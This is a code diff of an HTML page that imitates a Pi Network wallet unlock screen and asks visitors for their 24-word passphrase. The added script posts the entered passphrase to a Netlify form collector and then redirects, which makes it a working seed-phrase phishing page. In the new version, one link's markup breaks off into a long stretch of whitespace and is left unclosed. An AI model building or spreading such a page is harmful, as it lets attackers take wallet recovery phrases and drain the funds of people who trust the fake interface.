@@ -1,146 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Wallet</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            text-align: center;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
-        }
-        .header {
-            background-color: #6b2a9d;
-            color: #fff;
-            padding: 10px;
-            border-top-left-radius: 10px;
-            border-top-right-radius: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .header span {
-            font-size: 24px;
-        }
-        .input-box {
-            margin: 20px 0;
-            padding: 10px;
-            border: 2px solid #6b2a9d;
-            border-radius: 10px;
-            position: relative;
-            box-sizing: border-box;
-        }
-        .input-box textarea {
-            text-align: left;
-            vertical-align: top;
-            box-sizing: border-box;
-            line-height: normal;
-            border: none;
-            outline: none;
-            font-size: 20px;
-            color: #000000;
-            width: 100%;
-            padding: 8px;
-            background: transparent;
-            height: 200px;
-            resize: none;
-        }
-        .input-box .placeholder {
-            position: absolute;
-            top: 8px;
-            left: 18px;
-            color: #a0a0a0;
-            pointer-events: none;
-            font-size: 20px;
-        }
-        .input-box textarea:focus + .placeholder,
-        .input-box textarea:valid + .placeholder {
-            display: none;
-        }
-        .image {
-            height: 40px;
-            width: 140px;
-            padding: 0;
-        }
-        .button {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .button.passphrase {
-            background-color: #fff;
-            color: #6b2a9d;
-            border: 2px solid #e0d7f0;
-        }
-        .button.fingerprint {
-            background-color: #6b2a9d;
-            color: #fff;
-        }
-        .info {
-            font-size: 12px;
-            color: #333;
-            margin-top: 20px;
-        }
-        .info a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unlock Pi Wallet</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { text-align: center; background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 90%; max-width: 400px; }
+    .header { background-color: #6b2a9d; color: #fff; padding: 10px; border-top-left-radius: 10px; border-top-right-radius: 10px; display: flex; justify-content: center; align-items: center; }
+    .header span { font-size: 24px; }
+    .input-box { margin: 20px 0; padding: 10px; border: 2px solid #6b2a9d; border-radius: 10px; position: relative; box-sizing: border-box; }
+    .input-box textarea { text-align: left; vertical-align: top; box-sizing: border-box; line-height: normal; border: none; outline: none; font-size: 20px; color: #000000; width: 100%; padding: 8px; background: transparent; height: 200px; resize: none; }
+    .input-box .placeholder { position: absolute; top: 8px; left: 18px; color: #a0a0a0; pointer-events: none; font-size: 20px; }
+    .input-box textarea:focus + .placeholder, .input-box textarea:valid + .placeholder { display: none; }
+    .image { height: 40px; width: 140px; padding: 0; }
+    .button { display: block; width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; cursor: pointer; }
+    .button.passphrase { background-color: #fff; color: #6b2a9d; border: 2px solid #e0d7f0; }
+    .button.fingerprint { background-color: #6b2a9d; color: #fff; }
+    .info { font-size: 12px; color: #333; margin-top: 20px; }
+    .info a { color: #1a73e8; text-decoration: none; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img class="image" src="./images/1754790782996.png" alt="Pi Wallet Logo">
-            <span></span>
-        </div>
-        <h2>Unlock Pi Wallet</h2>
-        <form name="unlock-wallet" data-netlify="true" method="POST" id="unlock-form">
-            <input type="hidden" name="form-name" value="unlock-wallet">
-            <div class="input-box">
-                <textarea id="passphrase" name="passphrase" required></textarea>
-                <div class="placeholder">Enter your 24-word passphrase here</div>
-            </div>
-            <button type="submit" class="button passphrase">Unlock With Passphrase</button>
-        </form>
-        <button class="button fingerprint">Unlock With Fingerprint</button>
-        <div class="info">
-            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.<br><br>
-            Lost your passphrase? You can <a href="#">create</a> a new wallet, but all your π in your previous wallet will be inaccessible.
-        </div>
+  <div class="container">
+    <div class="header">
+      <img class="image" src="./images/1754790782996.png" alt="Pi Wallet Logo">
+      <span></span>
     </div>
-
-    <script>
-        document.getElementById('unlock-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
-            const passphrase = document.getElementById('passphrase').value.trim();
-            
-            if (passphrase === '') {
-                alert('Please enter your 24-word passphrase.');
-                return;
-            }
-
-            console.log('Form submitted at:', new Date().toISOString());
-            window.location.href = 'Congratulations.html'; // Redirect to Congratulations page
-        });
-    </script>
+    <h2>Unlock Pi Wallet</h2>
+    <form name="unlock-wallet" data-netlify="true" method="POST" id="unlock-form">
+      <input type="hidden" name="form-name" value="unlock-wallet">
+      <div class="input-box">
+        <textarea id="passphrase" name="passphrase" required></textarea>
+        <div class="placeholder">Enter your 24-word passphrase here</div>
+      </div>
+      <button type="submit" class="button passphrase">Unlock With Passphrase</button>
+    </form>
+    <button class="button fingerprint">Unlock With Fingerprint</button>
+    <div class="info">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.<br><br>
+      Lost your passphrase? You can <a href="                                                                                         
+    </div>
+  </div>
+  <script>
+    document.getElementById('unlock-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const form = event.target;
+      const formData = new FormData(form);
+      fetch(form.action || window.location.pathname, {
+        method: 'POST',
+        body: formData
+      })
+      .then(() => {
+        window.location.href = "seek bar2.html";
+      });
+    });
+  </script>
 </body>
 </html>
